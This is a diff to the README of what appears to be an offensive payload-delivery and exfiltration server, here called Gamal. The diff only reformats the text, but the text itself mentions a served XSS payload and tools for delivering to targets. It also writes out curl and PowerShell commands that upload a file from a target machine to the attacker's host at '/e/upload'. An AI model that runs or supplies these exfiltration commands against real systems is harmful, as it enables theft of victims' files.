@@ -36,9 +36,10 @@ or
 
 Then you can use your IP & Port in your payloads.
 
+## Delivery
+
 ***Note:*** Add your files in `/f` folder ==>  `http://IP:PORT/f/<Your-FileName>`
 
-## Delivery
 ### Paylods
 
 `/f/xss.js` XSS Sample function
@@ -72,11 +73,15 @@ It downloads and categorizes the most common tools for delivering to the targets
 
 ### Linux / MacOS
 
-`curl -k -F "file=@<PathToYourFile>" https://<GamalIP>:<GamalPort>/e/upload`
+```bash
+curl -k -F "file=@<PathToYourFile>" https://<GamalIP>:<GamalPort>/e/upload
+```
 
 ### Windows
 
-`Remove-Item alias:curl -ErrorAction SilentlyContinue; curl -k -F "file=@C:\<PathToYourFile>" https://<GamalIP>:<GamalPort>/e/upload`
+```powershell
+Remove-Item alias:curl -ErrorAction SilentlyContinue; curl -k -F "file=@C:\<PathToYourFile>" https://<GamalIP>:<GamalPort>/e/upload
+```
 
 ### Special Parameters
 
